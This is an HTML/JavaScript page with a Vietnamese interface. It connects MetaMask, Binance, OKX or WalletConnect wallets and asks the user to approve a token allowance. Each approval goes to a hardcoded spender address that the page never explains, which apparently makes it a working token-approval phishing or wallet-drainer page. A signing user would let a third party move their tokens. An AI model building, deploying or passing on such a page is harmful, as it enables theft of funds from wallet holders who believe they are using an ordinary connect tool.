<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Multi Wallet + QR Connect</title>
  <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
  <style>
    body { font-family: Arial; padding: 30px; text-align: center; background: #f2f2f2; }
    #app { max-width: 500px; margin: auto; background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    input, button, select {
      width: 90%;
      padding: 10px;
      margin: 10px;
      font-size: 16px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    button { background: #2196F3; color: white; border: none; cursor: pointer; }
    button:disabled { background: #aaa; }
  </style>
</head>
<body>
  <div id="app">
    <div id="status">Vui lòng chọn ví để kết nối</div>

    <select id="walletSelect">
      <option value="">-- Chọn ví --</option>
      <option value="metamask">MetaMask</option>
      <option value="binance">Binance Wallet</option>
      <option value="okx">OKX Wallet</option>
      <option value="walletconnect">QR (WalletConnect)</option>
    </select>
    <button id="connectBtn">Kết nối ví</button>

    <input type="text" id="tokenAddress" placeholder="Token address cần approve">
    <input type="text" id="amount" placeholder="Số lượng muốn approve">
    <button id="approveBtn" disabled>Approve</button>
  </div>

  <script>
    const scB_address = "0xb300000b72DEAEb607a12d5f54773D1C19c7028d";
    let signer, provider;

    async function connectWallet() {
      const selectedWallet = document.getElementById("walletSelect").value;

      try {
        if (selectedWallet === "metamask") {
          provider = window.ethereum;
        } else if (selectedWallet === "binance") {
          provider = window.BinanceChain;
        } else if (selectedWallet === "okx") {
          provider = window.okxwallet;
        } else if (selectedWallet === "walletconnect") {
          provider = new WalletConnectProvider.default({
            rpc: {
              56: "https://bsc-dataseed.binance.org/"
            },
            chainId: 56
          });
          await provider.enable(); // Hiện QR code
        }

        if (!provider) {
          document.getElementById("status").innerText = "Không tìm thấy ví!";
          return;
        }

        const ethersProvider = new ethers.providers.Web3Provider(provider);
        signer = ethersProvider.getSigner();
        const address = await signer.getAddress();
        document.getElementById("status").innerText = "Đã kết nối: " + address;
        document.getElementById("approveBtn").disabled = false;

      } catch (err) {
        console.error(err);
        document.getElementById("status").innerText = "Lỗi kết nối ví: " + err.message;
      }
    }

    async function approveToken() {
      const tokenAddress = document.getElementById("tokenAddress").value;
      const amount = document.getElementById("amount").value;

      if (!ethers.utils.isAddress(tokenAddress)) {
        document.getElementById("status").innerText = "Địa chỉ token không hợp lệ!";
        return;
      }

      try {
        const contract = new ethers.Contract(tokenAddress, [
          "function approve(address spender, uint256 amount) public returns (bool)",
          "function decimals() public view returns (uint8)"
        ], signer);

        const decimals = await contract.decimals();
        const parsedAmount = ethers.utils.parseUnits(amount, decimals);
        document.getElementById("status").innerText = "Đang gửi approve...";

        const tx = await contract.approve(scB_address, parsedAmount);
        await tx.wait();

        document.getElementById("status").innerText = "Approve thành công! Tx: " + tx.hash;
      } catch (err) {
        console.error(err);
        document.getElementById("status").innerText = "Lỗi approve: " + err.message;
      }
    }

    document.getElementById("connectBtn").addEventListener("click", connectWallet);
    document.getElementById("approveBtn").addEventListener("click", approveToken);
  </script>
</body>
</html>
